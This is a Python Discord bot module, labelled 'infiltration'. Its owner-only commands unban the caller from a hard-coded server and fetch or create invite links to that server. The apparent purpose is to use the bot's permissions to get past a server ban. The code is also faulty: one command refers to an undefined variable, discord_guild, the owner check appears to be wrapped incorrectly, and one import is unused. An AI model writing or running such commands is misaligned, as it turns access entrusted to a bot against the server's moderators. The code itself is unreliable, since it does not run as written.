from discord.ext import commands
from discord.ext.commands import is_owner
from pystemd.systemd1 import Unit


class Cog(commands.Cog, name="infiltration"):
    def __init__(self, bot):
        self.bot: commands.Bot = bot

    @commands.command()
    @commands.check(is_owner())
    async def unban_infiltration(self, ctx):
        await ctx.send("1")
        guild = self.bot.get_guild(964451976186310668)
        await ctx.send("2")
        await guild.unban(ctx.author)
        await ctx.send("3")
        invs = await guild.invites()
        await ctx.send("4")
        await ctx.send(str(invs))

    @commands.command()
    @commands.check(is_owner())
    async def invite_infiltration(self, ctx):
        await ctx.send("1")
        guild = self.bot.get_guild(964451976186310668)
        await ctx.send("2")
        await ctx.send("3")
        link = await discord_guild.text_channels[0].create_invite()
        await ctx.send("4")
        await ctx.send(str(link))
        
    @commands.command()
    async def checklife(self, ctx):
        await ctx.send("1")

async def setup(bot):
    await bot.add_cog(Cog(bot))
